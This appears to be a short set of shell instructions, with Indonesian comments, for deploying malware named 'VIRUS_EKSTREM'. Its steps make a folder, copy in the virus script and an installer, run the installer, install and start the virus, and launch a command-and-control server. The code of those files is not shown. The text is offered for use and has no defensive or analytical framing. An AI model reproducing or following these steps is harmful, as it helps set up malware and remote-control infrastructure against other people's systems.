# 1. Buat folder virus
mkdir VIRUS_EKSTREM
cd VIRUS_EKSTREM

# 2. Copy semua file di atas
# - virus_ekstrem.py (main)
# - install.sh

# 3. Install virus
chmod +x install.sh
./install.sh

# 4. Jalankan
python3 virus_ekstrem.py install
python3 virus_ekstrem.py start

# 5. C2 server
cd c2
python3 server.py